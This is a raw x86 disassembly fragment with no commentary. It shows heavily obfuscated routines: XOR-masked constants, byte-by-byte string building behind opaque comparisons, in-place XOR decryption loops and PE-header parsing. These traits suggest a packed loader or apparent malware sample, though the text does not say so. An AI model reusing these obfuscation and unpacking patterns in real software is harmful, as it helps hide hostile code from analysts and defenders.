  4250f5:	mov    ecx,DWORD PTR [ebp-0x44]
  4250f8:	xor    eax,ebx
  4250fa:	add    eax,esi
  4250fc:	imul   eax,ecx
  4250ff:	mov    ecx,DWORD PTR [ebp-0xe8]
  425105:	xor    ecx,ebx
  425107:	add    eax,ecx
  425109:	mov    ecx,DWORD PTR [ebp-0x8]
  42510c:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f8]
  425114:	mov    ecx,DWORD PTR [ebp-0xe0]
  42511a:	xor    ecx,ebx
  42511c:	lea    eax,[ecx+eax*1+0x3272f8]
  425123:	movzx  ecx,BYTE PTR [ebp-0x2]
  425127:	xor    ecx,eax
  425129:	mov    BYTE PTR [ebp-0x2],cl
  42512c:	mov    al,BYTE PTR [ebp-0x2]
  42512f:	mov    ecx,DWORD PTR [ebp-0x1c]
  425132:	mov    edx,DWORD PTR [ebp-0x44]
  425135:	xor    ecx,ebx
  425137:	add    ecx,esi
  425139:	imul   ecx,edx
  42513c:	mov    edx,DWORD PTR [ebp-0x8]
  42513f:	mov    BYTE PTR [ecx+edx*1],al
  425142:	mov    eax,DWORD PTR [ebp-0x1c]
  425145:	mov    ecx,DWORD PTR [ebp-0x44]
  425148:	xor    eax,ebx
  42514a:	add    eax,esi
  42514c:	imul   eax,ecx
  42514f:	mov    ecx,DWORD PTR [ebp-0x8]
  425152:	mov    al,BYTE PTR [eax+ecx*1]
  425155:	mov    BYTE PTR [ebp-0x2],al
  425158:	mov    eax,DWORD PTR [ebp-0x1c]
  42515b:	mov    ecx,DWORD PTR [ebp-0x44]
  42515e:	xor    eax,ebx
  425160:	add    eax,esi
  425162:	imul   eax,ecx
  425165:	mov    ecx,DWORD PTR [ebp-0x34]
  425168:	xor    ecx,ebx
  42516a:	add    eax,ecx
  42516c:	mov    ecx,DWORD PTR [ebp-0x8]
  42516f:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f8]
  425177:	mov    ecx,DWORD PTR [ebp-0xc4]
  42517d:	xor    ecx,ebx
  42517f:	lea    eax,[ecx+eax*1+0x3272f8]
  425186:	movzx  ecx,BYTE PTR [ebp-0x2]
  42518a:	xor    ecx,eax
  42518c:	mov    BYTE PTR [ebp-0x2],cl
  42518f:	mov    al,BYTE PTR [ebp-0x2]
  425192:	mov    ecx,DWORD PTR [ebp-0x1c]
  425195:	mov    edx,DWORD PTR [ebp-0x44]
  425198:	xor    ecx,ebx
  42519a:	add    ecx,esi
  42519c:	imul   ecx,edx
  42519f:	mov    edx,DWORD PTR [ebp-0x8]
  4251a2:	mov    BYTE PTR [ecx+edx*1],al
  4251a5:	mov    eax,DWORD PTR [ebp-0x30]
  4251a8:	mov    ecx,DWORD PTR [ebp-0x34]
  4251ab:	xor    eax,ebx
  4251ad:	xor    ecx,ebx
  4251af:	add    eax,esi
  4251b1:	add    ecx,esi
  4251b3:	imul   eax,ecx
  4251b6:	add    eax,DWORD PTR [ebp-0x44]
  4251b9:	mov    DWORD PTR [ebp-0x44],eax
  4251bc:	mov    eax,DWORD PTR [ebp-0x44]
  4251bf:	mov    ecx,DWORD PTR [ebp-0x14]
  4251c2:	cmp    ecx,eax
  4251c4:	jb     0x4250c8
  4251ca:	mov    eax,DWORD PTR [ebp-0x34]
  4251cd:	mov    ecx,DWORD PTR [ebp-0x14]
  4251d0:	xor    eax,ebx
  4251d2:	add    eax,esi
  4251d4:	imul   eax,ecx
  4251d7:	mov    ecx,DWORD PTR [ebp-0x20]
  4251da:	xor    ecx,ebx
  4251dc:	add    ecx,esi
  4251de:	or     eax,ecx
  4251e0:	mov    ecx,DWORD PTR [ebp-0x2c]
  4251e3:	xor    ecx,ebx
  4251e5:	add    eax,ecx
  4251e7:	mov    ecx,DWORD PTR [ebp-0x2c]
  4251ea:	xor    ecx,ebx
  4251ec:	add    eax,ecx
  4251ee:	mov    ecx,DWORD PTR [ebp-0xc]
  4251f1:	lea    eax,[eax+ecx*1+0x64e5f0]
  4251f8:	jmp    0x425209
  4251fa:	mov    eax,DWORD PTR [ebp-0x2c]
  4251fd:	mov    ecx,DWORD PTR [ebp-0xc]
  425200:	xor    eax,ebx
  425202:	lea    eax,[eax+ecx*1+0x3272f8]
  425209:	mov    DWORD PTR [ebp-0xc],eax
  42520c:	mov    eax,DWORD PTR [ebp-0x2c]
  42520f:	xor    eax,ebx
  425211:	mov    ecx,0xffcd8d08
  425216:	sub    ecx,eax
  425218:	add    ecx,DWORD PTR [ebp-0x28]
  42521b:	mov    eax,DWORD PTR [ebp-0x2c]
  42521e:	mov    edx,DWORD PTR [ebp-0xc]
  425221:	xor    eax,ebx
  425223:	add    eax,esi
  425225:	imul   eax,edx
  425228:	cmp    eax,ecx
  42522a:	jbe    0x42503c
  425230:	mov    eax,DWORD PTR [ebp-0x10]
  425233:	mov    ecx,DWORD PTR [ebp-0x40]
  425236:	mov    eax,DWORD PTR [ebp+0x8]
  425239:	mov    edx,DWORD PTR [ebp-0x54]
  42523c:	mov    eax,DWORD PTR [eax+0x1e0]
  425242:	xor    edx,ebx
  425244:	add    edx,esi
  425246:	push   edx
  425247:	mov    edx,DWORD PTR [ebp-0x3c]
  42524a:	xor    edx,ebx
  42524c:	add    edx,esi
  42524e:	push   edx
  42524f:	push   ecx
  425250:	mov    DWORD PTR [ebp-0x30],ecx
  425253:	mov    ecx,DWORD PTR [ebp-0x10]
  425256:	xor    ecx,ebx
  425258:	add    ecx,esi
  42525a:	push   ecx
  42525b:	call   DWORD PTR [eax+0x14]
  42525e:	mov    edi,eax
  425260:	mov    eax,DWORD PTR [ebp-0x10]
  425263:	xor    eax,ebx
  425265:	add    eax,esi
  425267:	cmp    eax,edi
  425269:	je     0x4252c4
  42526b:	mov    eax,DWORD PTR [ebp-0x10]
  42526e:	jmp    0x425291
  425270:	mov    ecx,DWORD PTR [ebp-0x24]
  425273:	xor    eax,ebx
  425275:	mov    cl,BYTE PTR [ecx+eax*1+0x3272f8]
  42527c:	mov    BYTE PTR [eax+edi*1+0x3272f8],cl
  425283:	mov    ecx,DWORD PTR [ebp-0x18]
  425286:	xor    ecx,ebx
  425288:	lea    eax,[ecx+eax*1+0x3272f8]
  42528f:	xor    eax,ebx
  425291:	mov    ecx,DWORD PTR [ebp-0x40]
  425294:	sub    ecx,esi
  425296:	xor    ecx,ebx
  425298:	cmp    eax,ecx
  42529a:	jne    0x425270
  42529c:	mov    eax,DWORD PTR [ebp+0x8]
  42529f:	mov    ecx,DWORD PTR [ebp-0x50]
  4252a2:	mov    eax,DWORD PTR [eax+0x1e0]
  4252a8:	xor    ecx,ebx
  4252aa:	add    ecx,esi
  4252ac:	push   ecx
  4252ad:	mov    ecx,DWORD PTR [ebp-0x10]
  4252b0:	xor    ecx,ebx
  4252b2:	add    ecx,esi
  4252b4:	push   ecx
  4252b5:	push   DWORD PTR [ebp-0x24]
  4252b8:	call   DWORD PTR [eax+0x18]
  4252bb:	mov    eax,DWORD PTR [ebp-0x30]
  4252be:	mov    DWORD PTR [ebp-0x24],edi
  4252c1:	mov    DWORD PTR [ebp-0x40],eax
  4252c4:	mov    edi,DWORD PTR [ebp-0x24]
  4252c7:	mov    eax,DWORD PTR [ebp-0x18]
  4252ca:	mov    ecx,DWORD PTR [ebp-0x10]
  4252cd:	xor    eax,ebx
  4252cf:	mov    DWORD PTR [ebp-0x30],edi
  4252d2:	add    eax,esi
  4252d4:	mov    DWORD PTR [ebp-0x5c],0xbcd3cbd3
  4252db:	mov    DWORD PTR [ebp-0x58],0xc6d3bed3
  4252e2:	jmp    0x425316
  4252e4:	xor    ecx,ebx
  4252e6:	mov    dl,BYTE PTR [ebp+ecx*1+0x32729c]
  4252ed:	xor    dl,0x80
  4252f0:	add    dl,0x5
  4252f3:	mov    DWORD PTR [ebp-0x3c],ecx
  4252f6:	movsx  ecx,BYTE PTR [ecx+edi*1+0x3272f8]
  4252fe:	movzx  edx,dl
  425301:	cmp    ecx,edx
  425303:	jne    0x425320
  425305:	mov    ecx,DWORD PTR [ebp-0x18]
  425308:	mov    edx,DWORD PTR [ebp-0x3c]
  42530b:	xor    ecx,ebx
  42530d:	lea    ecx,[ecx+edx*1+0x3272f8]
  425314:	xor    ecx,ebx
  425316:	cmp    ecx,0xf89c85a1
  42531c:	jne    0x4252e4
  42531e:	jmp    0x425327
  425320:	mov    eax,DWORD PTR [ebp-0x10]
  425323:	xor    eax,ebx
  425325:	add    eax,esi
  425327:	mov    ecx,DWORD PTR [ebp-0x10]
  42532a:	xor    ecx,ebx
  42532c:	add    ecx,esi
  42532e:	cmp    ecx,eax
  425330:	je     0x4254a3
  425336:	mov    eax,DWORD PTR [edi+0x8]
  425339:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  425340:	mov    DWORD PTR [ebp-0x3c],0xf89cc3c6
  425347:	mov    DWORD PTR [ebp-0x48],0xf89cb5b9
  42534e:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  425355:	mov    DWORD PTR [ebp-0x14],eax
  425358:	mov    eax,DWORD PTR [ebp+0x8]
  42535b:	mov    ecx,DWORD PTR [ebp-0x20]
  42535e:	xor    ecx,ebx
  425360:	add    ecx,esi
  425362:	push   ecx
  425363:	mov    ecx,DWORD PTR [ebp-0x48]
  425366:	mov    eax,DWORD PTR [eax+0x1e0]
  42536c:	xor    ecx,ebx
  42536e:	add    ecx,esi
  425370:	push   ecx
  425371:	mov    ecx,DWORD PTR [ebp-0x3c]
  425374:	xor    ecx,ebx
  425376:	add    ecx,esi
  425378:	push   ecx
  425379:	mov    ecx,DWORD PTR [ebp-0xc]
  42537c:	xor    ecx,ebx
  42537e:	add    ecx,esi
  425380:	push   ecx
  425381:	call   DWORD PTR [eax+0x14]
  425384:	mov    edi,eax
  425386:	mov    eax,DWORD PTR [ebp+0x8]
  425389:	mov    ecx,DWORD PTR [ebp-0x20]
  42538c:	mov    eax,DWORD PTR [eax+0x1e0]
  425392:	xor    ecx,ebx
  425394:	add    ecx,esi
  425396:	push   ecx
  425397:	mov    ecx,DWORD PTR [ebp-0x48]
  42539a:	xor    ecx,ebx
  42539c:	add    ecx,esi
  42539e:	push   ecx
  42539f:	mov    ecx,DWORD PTR [ebp-0xc]
  4253a2:	push   DWORD PTR [ebp-0x14]
  4253a5:	xor    ecx,ebx
  4253a7:	add    ecx,esi
  4253a9:	push   ecx
  4253aa:	call   DWORD PTR [eax+0x14]
  4253ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4253b0:	xor    ecx,ebx
  4253b2:	add    ecx,esi
  4253b4:	mov    DWORD PTR [ebp-0x20],eax
  4253b7:	cmp    ecx,edi
  4253b9:	je     0x425746
  4253bf:	mov    ecx,DWORD PTR [ebp-0xc]
  4253c2:	xor    ecx,ebx
  4253c4:	add    ecx,esi
  4253c6:	cmp    ecx,eax
  4253c8:	je     0x425746
  4253ce:	mov    DWORD PTR [ebp-0x3c],0xf89c85ba
  4253d5:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  4253dc:	mov    ecx,DWORD PTR [ebp-0x3c]
  4253df:	xor    cl,0xb1
  4253e2:	sub    cl,0x8
  4253e5:	mov    BYTE PTR [edi],cl
  4253e7:	mov    ecx,DWORD PTR [ebp-0xc]
  4253ea:	xor    cl,0xb1
  4253ed:	sub    cl,0x8
  4253f0:	mov    BYTE PTR [edi+0x1],cl
  4253f3:	mov    ecx,DWORD PTR [ebp-0x54]
  4253f6:	xor    cl,0xb1
  4253f9:	sub    cl,0x8
  4253fc:	mov    BYTE PTR [edi+0x2],cl
  4253ff:	and    DWORD PTR [ebp-0xc8],0x0
  425406:	and    DWORD PTR [ebp-0xdc],0x0
  42540d:	lea    ecx,[ebp-0xdc]
  425413:	push   ecx
  425414:	push   DWORD PTR [ebp-0x14]
  425417:	push   eax
  425418:	lea    eax,[ebp-0xc8]
  42541e:	push   eax
  42541f:	mov    eax,DWORD PTR [ebp-0x30]
  425422:	push   DWORD PTR [eax+0xc]
  425425:	mov    eax,DWORD PTR [ebp-0x24]
  425428:	add    eax,0x10
  42542b:	push   eax
  42542c:	push   edi
  42542d:	call   0x4246d3
  425432:	mov    DWORD PTR [ebp-0x3c],eax
  425435:	mov    eax,DWORD PTR [ebp+0x8]
  425438:	mov    ecx,DWORD PTR [ebp-0x50]
  42543b:	mov    eax,DWORD PTR [eax+0x1e0]
  425441:	xor    ecx,ebx
  425443:	add    ecx,esi
  425445:	push   ecx
  425446:	mov    ecx,DWORD PTR [ebp-0xc]
  425449:	xor    ecx,ebx
  42544b:	add    ecx,esi
  42544d:	push   ecx
  42544e:	push   edi
  42544f:	call   DWORD PTR [eax+0x18]
  425452:	mov    eax,DWORD PTR [ebp-0x3c]
  425455:	add    eax,0xffcd8d08
  42545a:	xor    eax,ebx
  42545c:	cmp    eax,0xf89c85b9
  425461:	mov    eax,DWORD PTR [ebp+0x8]
  425464:	mov    eax,DWORD PTR [eax+0x1e0]
  42546a:	mov    ecx,DWORD PTR [ebp-0x50]
  42546d:	jne    0x425490
  42546f:	xor    ecx,ebx
  425471:	add    ecx,esi
  425473:	push   ecx
  425474:	mov    ecx,DWORD PTR [ebp-0xc]
  425477:	xor    ecx,ebx
  425479:	add    ecx,esi
  42547b:	push   ecx
  42547c:	push   DWORD PTR [ebp-0x24]
  42547f:	call   DWORD PTR [eax+0x18]
  425482:	mov    eax,DWORD PTR [ebp-0x20]
  425485:	mov    DWORD PTR [ebp-0x24],eax
  425488:	mov    eax,DWORD PTR [ebp-0x14]
  42548b:	mov    DWORD PTR [ebp-0x40],eax
  42548e:	jmp    0x4254a3
  425490:	xor    ecx,ebx
  425492:	add    ecx,esi
  425494:	push   ecx
  425495:	mov    ecx,DWORD PTR [ebp-0xc]
  425498:	xor    ecx,ebx
  42549a:	add    ecx,esi
  42549c:	push   ecx
  42549d:	push   DWORD PTR [ebp-0x20]
  4254a0:	call   DWORD PTR [eax+0x18]
  4254a3:	mov    eax,DWORD PTR [ebp-0x40]
  4254a6:	mov    DWORD PTR [ebp-0x38],eax
  4254a9:	mov    eax,DWORD PTR [ebp-0x24]
  4254ac:	mov    DWORD PTR [ebp-0x28],0xf89c85b9
  4254b3:	mov    DWORD PTR [ebp-0x3c],eax
  4254b6:	mov    edi,0xf89c85b8
  4254bb:	mov    DWORD PTR [ebp-0x2c],edi
  4254be:	mov    eax,DWORD PTR [ebp-0x28]
  4254c1:	xor    eax,ebx
  4254c3:	add    eax,esi
  4254c5:	mov    DWORD PTR [ebp-0xc],eax
  4254c8:	mov    eax,DWORD PTR [ebp-0x28]
  4254cb:	xor    eax,ebx
  4254cd:	add    eax,esi
  4254cf:	mov    DWORD PTR [ebp-0x14],eax
  4254d2:	mov    DWORD PTR [ebp-0x48],0xf89c8599
  4254d9:	mov    DWORD PTR [ebp-0x20],0xf89c85be
  4254e0:	mov    eax,DWORD PTR [ebp-0x28]
  4254e3:	mov    ecx,DWORD PTR [ebp-0x38]
  4254e6:	xor    eax,ebx
  4254e8:	add    eax,esi
  4254ea:	cmp    ecx,eax
  4254ec:	je     0x4256e2
  4254f2:	jmp    0x4256be
  4254f7:	mov    ecx,DWORD PTR [ebp-0xc]
  4254fa:	mov    eax,DWORD PTR [ebp-0x38]
  4254fd:	sub    eax,ecx
  4254ff:	mov    ecx,DWORD PTR [ebp-0x48]
  425502:	xor    ecx,ebx
  425504:	add    ecx,esi
  425506:	xor    edx,edx
  425508:	div    ecx
  42550a:	mov    DWORD PTR [ebp-0x14],eax
  42550d:	mov    eax,DWORD PTR [ebp-0x20]
  425510:	mov    ecx,DWORD PTR [ebp-0x14]
  425513:	xor    eax,ebx
  425515:	add    eax,esi
  425517:	cmp    ecx,eax
  425519:	jbe    0x425525
  42551b:	mov    eax,DWORD PTR [ebp-0x20]
  42551e:	xor    eax,ebx
  425520:	add    eax,esi
  425522:	mov    DWORD PTR [ebp-0x14],eax
  425525:	mov    eax,DWORD PTR [ebp-0x48]
  425528:	mov    ecx,DWORD PTR [ebp-0x14]
  42552b:	xor    eax,ebx
  42552d:	add    eax,esi
  42552f:	imul   eax,ecx
  425532:	mov    DWORD PTR [ebp-0x14],eax
  425535:	mov    eax,DWORD PTR [ebp-0x28]
  425538:	mov    ecx,DWORD PTR [ebp-0x14]
  42553b:	xor    eax,ebx
  42553d:	add    eax,esi
  42553f:	cmp    ecx,eax
  425541:	je     0x4256ac
  425547:	mov    eax,DWORD PTR [ebp-0x14]
  42554a:	mov    DWORD PTR [ebp-0x34],eax
  42554d:	mov    eax,DWORD PTR [ebp-0xc]
  425550:	add    eax,DWORD PTR [ebp-0x3c]
  425553:	mov    DWORD PTR [ebp-0x4c],0xf89c85b9
  42555a:	mov    DWORD PTR [ebp-0x14],edi
  42555d:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  425564:	mov    DWORD PTR [ebp-0x1c],eax
  425567:	mov    DWORD PTR [ebp-0x30],0xf89c85ba
  42556e:	mov    DWORD PTR [ebp-0x8],edi
  425571:	mov    eax,DWORD PTR [ebp-0x4c]
  425574:	xor    eax,ebx
  425576:	add    eax,esi
  425578:	jmp    0x42566b
  42557d:	mov    DWORD PTR [ebp-0xe4],0xf89c85a2
  425587:	mov    DWORD PTR [ebp-0xd0],0xf89c85af
  425591:	mov    eax,DWORD PTR [ebp-0x8]
  425594:	mov    ecx,DWORD PTR [ebp-0x18]
  425597:	xor    eax,ebx
  425599:	add    eax,esi
  42559b:	imul   eax,ecx
  42559e:	mov    ecx,DWORD PTR [ebp-0x1c]
  4255a1:	mov    al,BYTE PTR [eax+ecx*1]
  4255a4:	mov    BYTE PTR [ebp-0x1],al
  4255a7:	mov    eax,DWORD PTR [ebp-0x8]
  4255aa:	mov    ecx,DWORD PTR [ebp-0x18]
  4255ad:	xor    eax,ebx
  4255af:	add    eax,esi
  4255b1:	imul   eax,ecx
  4255b4:	mov    ecx,DWORD PTR [ebp-0x54]
  4255b7:	xor    ecx,ebx
  4255b9:	add    eax,ecx
  4255bb:	mov    ecx,DWORD PTR [ebp-0x1c]
  4255be:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f8]
  4255c6:	mov    ecx,DWORD PTR [ebp-0xe4]
  4255cc:	xor    ecx,ebx
  4255ce:	lea    eax,[ecx+eax*1+0x3272f8]
  4255d5:	movzx  ecx,BYTE PTR [ebp-0x1]
  4255d9:	xor    ecx,eax
  4255db:	mov    BYTE PTR [ebp-0x1],cl
  4255de:	mov    al,BYTE PTR [ebp-0x1]
  4255e1:	mov    ecx,DWORD PTR [ebp-0x8]
  4255e4:	mov    edx,DWORD PTR [ebp-0x18]
  4255e7:	xor    ecx,ebx
  4255e9:	add    ecx,esi
  4255eb:	imul   ecx,edx
  4255ee:	mov    edx,DWORD PTR [ebp-0x1c]
  4255f1:	mov    BYTE PTR [ecx+edx*1],al
  4255f4:	mov    eax,DWORD PTR [ebp-0x8]
  4255f7:	mov    ecx,DWORD PTR [ebp-0x18]
  4255fa:	xor    eax,ebx
  4255fc:	add    eax,esi
  4255fe:	imul   eax,ecx
  425601:	mov    ecx,DWORD PTR [ebp-0x1c]
  425604:	mov    al,BYTE PTR [eax+ecx*1]
  425607:	mov    BYTE PTR [ebp-0x1],al
  42560a:	mov    eax,DWORD PTR [ebp-0x8]
  42560d:	mov    ecx,DWORD PTR [ebp-0x18]
  425610:	xor    eax,ebx
  425612:	add    eax,esi
  425614:	imul   eax,ecx
  425617:	mov    ecx,DWORD PTR [ebp-0x14]
  42561a:	xor    ecx,ebx
  42561c:	add    eax,ecx
  42561e:	mov    ecx,DWORD PTR [ebp-0x1c]
  425621:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f8]
  425629:	mov    ecx,DWORD PTR [ebp-0xd0]
  42562f:	xor    ecx,ebx
  425631:	lea    eax,[ecx+eax*1+0x3272f8]
  425638:	movzx  ecx,BYTE PTR [ebp-0x1]
  42563c:	xor    ecx,eax
  42563e:	mov    BYTE PTR [ebp-0x1],cl
  425641:	mov    al,BYTE PTR [ebp-0x1]
  425644:	mov    ecx,DWORD PTR [ebp-0x8]
  425647:	mov    edx,DWORD PTR [ebp-0x18]
  42564a:	xor    ecx,ebx
  42564c:	add    ecx,esi
  42564e:	imul   ecx,edx
  425651:	mov    edx,DWORD PTR [ebp-0x1c]
  425654:	mov    BYTE PTR [ecx+edx*1],al
  425657:	mov    eax,DWORD PTR [ebp-0x30]
  42565a:	mov    ecx,DWORD PTR [ebp-0x14]
  42565d:	xor    eax,ebx
  42565f:	xor    ecx,ebx
  425661:	add    eax,esi
  425663:	add    ecx,esi
  425665:	imul   eax,ecx
  425668:	add    eax,DWORD PTR [ebp-0x18]
  42566b:	mov    DWORD PTR [ebp-0x18],eax
  42566e:	mov    eax,DWORD PTR [ebp-0x18]
  425671:	mov    ecx,DWORD PTR [ebp-0x34]
  425674:	cmp    ecx,eax
  425676:	jb     0x42557d
  42567c:	mov    eax,DWORD PTR [ebp-0x14]
  42567f:	mov    ecx,DWORD PTR [ebp-0x34]
  425682:	xor    eax,ebx
  425684:	add    eax,esi
  425686:	imul   eax,ecx
  425689:	mov    ecx,DWORD PTR [ebp-0x4c]
  42568c:	xor    ecx,ebx
  42568e:	add    ecx,esi
  425690:	or     eax,ecx
  425692:	mov    ecx,DWORD PTR [ebp-0x2c]
  425695:	xor    ecx,ebx
  425697:	add    eax,ecx
  425699:	mov    ecx,DWORD PTR [ebp-0x2c]
  42569c:	xor    ecx,ebx
  42569e:	add    eax,ecx
  4256a0:	mov    ecx,DWORD PTR [ebp-0xc]
  4256a3:	lea    eax,[eax+ecx*1+0x64e5f0]
  4256aa:	jmp    0x4256bb
  4256ac:	mov    eax,DWORD PTR [ebp-0x2c]
  4256af:	mov    ecx,DWORD PTR [ebp-0xc]
  4256b2:	xor    eax,ebx
  4256b4:	lea    eax,[eax+ecx*1+0x3272f8]
  4256bb:	mov    DWORD PTR [ebp-0xc],eax
  4256be:	mov    eax,DWORD PTR [ebp-0x2c]
  4256c1:	xor    eax,ebx
  4256c3:	mov    ecx,0xffcd8d08
  4256c8:	sub    ecx,eax
  4256ca:	add    ecx,DWORD PTR [ebp-0x38]
  4256cd:	mov    eax,DWORD PTR [ebp-0x2c]
  4256d0:	mov    edx,DWORD PTR [ebp-0xc]
  4256d3:	xor    eax,ebx
  4256d5:	add    eax,esi
  4256d7:	imul   eax,edx
  4256da:	cmp    eax,ecx
  4256dc:	jbe    0x4254f7
  4256e2:	push   DWORD PTR [ebp+0x8]
  4256e5:	mov    eax,DWORD PTR [ebp+0x8]
  4256e8:	push   DWORD PTR [eax+0x1cc]
  4256ee:	lea    eax,[ebp-0xd8]
  4256f4:	push   eax
  4256f5:	mov    eax,DWORD PTR [ebp+0x8]
  4256f8:	mov    eax,DWORD PTR [eax+0x1c4]
  4256fe:	push   DWORD PTR [eax]
  425700:	mov    eax,DWORD PTR [ebp+0x8]
  425703:	mov    eax,DWORD PTR [eax+0x1c0]
  425709:	push   DWORD PTR [eax]
  42570b:	push   DWORD PTR [ebp-0x40]
  42570e:	push   DWORD PTR [ebp-0x24]
  425711:	call   0x4261a8
  425716:	mov    DWORD PTR [ebp-0x3c],eax
  425719:	mov    eax,DWORD PTR [ebp-0x10]
  42571c:	mov    ecx,DWORD PTR [ebp-0x24]
  42571f:	xor    eax,ebx
  425721:	add    eax,esi
  425723:	cmp    eax,ecx
  425725:	je     0x425746
  425727:	mov    eax,DWORD PTR [ebp+0x8]
  42572a:	mov    ecx,DWORD PTR [ebp-0x50]
  42572d:	mov    eax,DWORD PTR [eax+0x1e0]
  425733:	xor    ecx,ebx
  425735:	add    ecx,esi
  425737:	push   ecx
  425738:	mov    ecx,DWORD PTR [ebp-0x10]
  42573b:	xor    ecx,ebx
  42573d:	add    ecx,esi
  42573f:	push   ecx
  425740:	push   DWORD PTR [ebp-0x24]
  425743:	call   DWORD PTR [eax+0x18]
  425746:	pop    edi
  425747:	pop    esi
  425748:	pop    ebx
  425749:	leave  
  42574a:	ret    0x4
  42574d:	push   ebp
  42574e:	mov    ebp,esp
  425750:	push   ecx
  425751:	push   ecx
  425752:	lea    eax,[ebp-0x8]
  425755:	mov    DWORD PTR [ebp-0x4],eax
  425758:	push   esi
  425759:	mov    esi,DWORD PTR [ebp-0x4]
  42575c:	mov    eax,0xf881bacf
  425761:	mov    DWORD PTR [esi],eax
  425763:	mov    esi,DWORD PTR [ebp-0x8]
  425766:	cmp    esi,eax
  425768:	pop    esi
  425769:	jne    0x425773
  42576b:	mov    BYTE PTR [ecx+0xa],0x7b
  42576f:	mov    BYTE PTR [edx+0x8],0xce
  425773:	mov    BYTE PTR [edx+0xa],0x7b
  425777:	mov    BYTE PTR [ecx+0x2],0xe9
  42577b:	leave  
  42577c:	ret    
  42577d:	push   ebp
  42577e:	mov    ebp,esp
  425780:	push   ecx
  425781:	push   ecx
  425782:	lea    eax,[ebp-0x8]
  425785:	mov    DWORD PTR [ebp-0x4],eax
  425788:	mov    edx,DWORD PTR [ebp-0x4]
  42578b:	mov    eax,0xf88b0bd3
  425790:	mov    DWORD PTR [edx],eax
  425792:	mov    edx,DWORD PTR [ebp-0x8]
  425795:	cmp    edx,eax
  425797:	jne    0x4257a8
  425799:	mov    eax,DWORD PTR [ebp+0x8]
  42579c:	mov    BYTE PTR [ecx+0x9],0xef
  4257a0:	mov    BYTE PTR [eax+0x7],0xa6
  4257a4:	mov    BYTE PTR [ecx+0x6],0xee
  4257a8:	mov    BYTE PTR [ecx+0x3],0xdf
  4257ac:	leave  
  4257ad:	ret    0x4
  4257b0:	push   ebp
  4257b1:	mov    ebp,esp
  4257b3:	push   ecx
  4257b4:	push   ecx
  4257b5:	lea    eax,[ebp-0x8]
  4257b8:	mov    DWORD PTR [ebp-0x4],eax
  4257bb:	mov    edx,DWORD PTR [ebp-0x4]
  4257be:	mov    eax,0x7e0dacf
  4257c3:	mov    DWORD PTR [edx],eax
  4257c5:	mov    edx,DWORD PTR [ebp-0x8]
  4257c8:	cmp    edx,eax
  4257ca:	jne    0x4257d0
  4257cc:	mov    BYTE PTR [ecx+0x7],0xa6
  4257d0:	mov    eax,DWORD PTR [ebp+0x8]
  4257d3:	mov    BYTE PTR [ecx+0x1],0xe4
  4257d7:	mov    BYTE PTR [eax+0x9],0xcf
  4257db:	leave  
  4257dc:	ret    0x4
  4257df:	push   ebp
  4257e0:	mov    ebp,esp
  4257e2:	push   ecx
  4257e3:	push   ecx
  4257e4:	lea    eax,[ebp-0x8]
  4257e7:	mov    DWORD PTR [ebp-0x4],eax
  4257ea:	push   esi
  4257eb:	mov    esi,DWORD PTR [ebp-0x4]
  4257ee:	mov    eax,0x7060e3e
  4257f3:	mov    DWORD PTR [esi],eax
  4257f5:	mov    esi,DWORD PTR [ebp-0x8]
  4257f8:	cmp    esi,eax
  4257fa:	pop    esi
  4257fb:	jne    0x425807
  4257fd:	mov    BYTE PTR [edx+0x4],0xea
  425801:	mov    WORD PTR [ecx+0x3],0xeadf
  425807:	mov    BYTE PTR [edx],0xbe
  42580a:	leave  
  42580b:	ret    
  42580c:	push   ebp
  42580d:	mov    ebp,esp
  42580f:	push   ecx
  425810:	push   ecx
  425811:	lea    eax,[ebp-0x8]
  425814:	mov    DWORD PTR [ebp-0x4],eax
  425817:	mov    edx,DWORD PTR [ebp-0x4]
  42581a:	mov    eax,0xf8870b3f
  42581f:	mov    DWORD PTR [edx],eax
  425821:	mov    edx,DWORD PTR [ebp-0x8]
  425824:	cmp    edx,eax
  425826:	jne    0x425833
  425828:	mov    eax,DWORD PTR [ebp+0x8]
  42582b:	mov    BYTE PTR [ecx+0x8],0xee
  42582f:	mov    BYTE PTR [eax+0x1],0xe4
  425833:	mov    BYTE PTR [ecx+0x5],0xf2
  425837:	leave  
  425838:	ret    0x4
  42583b:	push   esi
  42583c:	mov    ecx,edi
  42583e:	call   0x42580c
  425843:	mov    edx,edi
  425845:	mov    ecx,esi
  425847:	mov    BYTE PTR [esi],0xde
  42584a:	call   0x4257df
  42584f:	push   esi
  425850:	mov    ecx,edi
  425852:	mov    BYTE PTR [esi+0x5],0xf2
  425856:	call   0x4257b0
  42585b:	push   esi
  42585c:	mov    BYTE PTR [esi+0x6],0xee
  425860:	call   0x42577d
  425865:	mov    BYTE PTR [esi+0x2],0xe9
  425869:	mov    edx,esi
  42586b:	jmp    0x42574d
  425870:	push   ebp
  425871:	mov    ebp,esp
  425873:	push   ecx
  425874:	mov    ecx,DWORD PTR [edx+0x194]
  42587a:	push   esi
  42587b:	mov    esi,DWORD PTR [ebp+0x8]
  42587e:	mov    esi,DWORD PTR [esi]
  425880:	mov    DWORD PTR [ecx],esi
  425882:	mov    ecx,DWORD PTR [edx+0x194]
  425888:	mov    ecx,DWORD PTR [ecx]
  42588a:	mov    esi,DWORD PTR [edx+0x190]
  425890:	mov    DWORD PTR [esi],ecx
  425892:	mov    eax,DWORD PTR [edx+0x194]
  425898:	mov    ecx,DWORD PTR [eax]
  42589a:	mov    ecx,DWORD PTR [ecx+0x3c]
  42589d:	add    ecx,DWORD PTR [eax]
  42589f:	mov    DWORD PTR [ebp-0x4],0xf89ca5b9
  4258a6:	mov    eax,DWORD PTR [ebp-0x4]
  4258a9:	movzx  ecx,WORD PTR [ecx+0x16]
  4258ad:	xor    eax,0x75108b1
  4258b2:	add    eax,0x3272f8
  4258b7:	pop    esi
  4258b8:	test   ecx,eax
  4258ba:	je     0x4258c8
  4258bc:	mov    eax,DWORD PTR [edx+0x1c8]
  4258c2:	mov    DWORD PTR [eax],0xf89c85b8
  4258c8:	leave  
  4258c9:	ret    0x4
  4258cc:	push   ebp
  4258cd:	mov    ebp,esp
  4258cf:	sub    esp,0x70
  4258d2:	and    DWORD PTR [ebp-0x20],0x0
